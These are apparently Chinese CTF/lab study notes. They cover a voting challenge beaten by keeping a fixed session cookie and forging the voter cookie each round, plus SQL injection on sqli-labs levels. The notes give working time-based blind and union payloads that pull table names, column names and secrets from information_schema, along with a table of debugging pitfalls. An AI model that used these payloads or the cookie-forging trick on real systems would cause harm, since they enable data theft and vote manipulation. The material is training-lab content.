## 二、知识点

### 1. 判重键定位（业务逻辑题的靶心）

服务端拿**哪个字段**判「这个人投过票了」？—— 逐个换掉、逐个保留试出来：

| Cookie | 作用 | 要不要换 |
|---|---|---|
| `sid` | 会话「通行证」 | **固定不变**（换了就从头开始） |
| `voter` | 访客标识 | **每轮新造**（判重看它） |

固定有效 `sid` + 每轮换 `voter` → **无限投票**。

### 2. 接口不需要猜，页面自己会说

前端要让「投票」按钮工作，就必须写清路径和方法：

```python
print(set(re.findall(r"['\"](/api/[A-Za-z0-9_/\-]+)", html)))   # {'/api/data', '/api/vote'}
```

**一个接口的字段名，就是下一个接口的参数名**：`/api/data` 返回 `target.vid = 7` → 投票参数就叫 `vid=7`。

### 3. 405 / 401 是金矿

| 返回 | 含义 |
|---|---|
| 404 | 接口不存在 |
| **405** | 接口**存在**，method 用错了 |
| **401 / 403** | 接口**存在**，只是要登录/权限 |

### 4. 时间盲注：延迟 = `sleep(N)` × 条件被求值的**行数**

不是「sleep 几秒就卡几秒」：

| 写法（Less-9，sleep(3)） | 实测延迟 |
|---|---|
| `id=1' and if(条件, sleep(3), 0)-- ` | **3.0s**（锚定 1 行 → 精确） |
| `id=-1' or if(条件, sleep(3), 0)-- ` | **≈40s**（按表行数叠加） |

**优先用 `and` + 锚定左值**；`and` 左边一行都不匹配时**一次都不 sleep** → 会被误判成「假」。

### 5. `information_schema` 必须按库收窄

本机实测 `information_schema.columns` 有 **3250 行**、横跨 **7 个库 / 304 张表** → 查列名**必须**同时限定 `table_schema` + `table_name`，否则 `group_concat` 被截断，捞回一堆无关的同名列。

不带库名的表名走**连接的默认库**（`select * from users` = `security.users`）；跨库要写全名 `` `challenges`.`7j2ha5vhrn` ``。

### 2. 时间盲注的三种写法对照（Less-15，同一条件，sleep(3)）

```sql
1' or  if(条件, sleep(3), sleep(0)) #                 -- 约 40s（13 行叠加）
1' or  if(id=8 and 条件, sleep(3), 0) #               -- 约 3s（锚定唯一行）
1' and if(条件, sleep(3), 0) #                        -- 精确 3s（推荐）
```

### 3. Less-54 贪婪读法（10 次尝试内通关）

```sql
-1' union select (select group_concat(table_name) from information_schema.tables
                  where table_schema='challenges'),2 #
-1' union select (select group_concat(column_name) from information_schema.columns
                  where table_schema='challenges' and column_name like 'secret%'),2 #
-1' union select (select `secret_9WEI` from `7j2ha5vhrn` limit 0,1),2 #
```

**注释符要用 `#` 不能用 `-- `** —— 需要吃掉原句尾部的 `LIMIT 0,1`，而 `--` 后面必须带空格，容易写断。

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| 投票脚本「没反应」，像卡死 | 循环里**一句 print 都没有**，200 次请求静默跑 40~50 秒；输出还攒在缓冲区 | 加进度 print + **`flush=True`**；flag 第 1 次就给，不必循环 |
| 跑一次要 49 秒 | 200 次请求**串行**，单次实测 150~270 ms → `200 × 0.2s ≈ 40s` | 不是网络故障，是数学 |
| `TypeError: 'Response' object is not subscriptable` | `r` 还是响应对象，没 `.json()` 就下标访问 | 先 `print(type(r))` 确认 |
| `TypeError: 'int' object is not subscriptable` | `r["data"]["votes"]` 是 int，却又往后下标 | 写路径前先确认那一层是 dict 还是 int |
| `KeyError: 'data'` | 返回结构不是预期的嵌套 dict | **先 `print(r.text)` 看生肉**，再 `print(list(j.keys()))` 逐层钻 |
| `ascii(...)=97` 判成假 | 想当然认为首字符是 `a`；实际 `Dumb` 首字符 ASCII 是 **68**；`=97` 是 `admin` | 判据要用**实测标定**，不是记忆 |
| `count(username)=1` 判成假 | `users` 表实际 **13 行** | 先量行数再写条件 |
| `if(select length(...)…)=5,sleep(2),sleep(0))` 报 `ERROR 1064` | 括号数不对 | `if((select …)=4,sleep(2),sleep(0))` —— 子查询要再包一层括号 |
| `ERROR 1305 FUNCTION security.asci does not exist` | 函数名拼错 | `ascii` |
| `and` 形态返回 0.02s 以为是假 | `username='1'` 匹配 0 行 → 一次都不 sleep | 换 `admin' and …`（匹配 1 行）→ 精确 3.03s |
| 用 `requests` 的 `params=` 发时间盲注 | requests 会把 `;` 编码成 `%3B`、`+` 也改写 → 之前的探测全是无效请求 | 改用**原始 socket** 拼接请求行 |
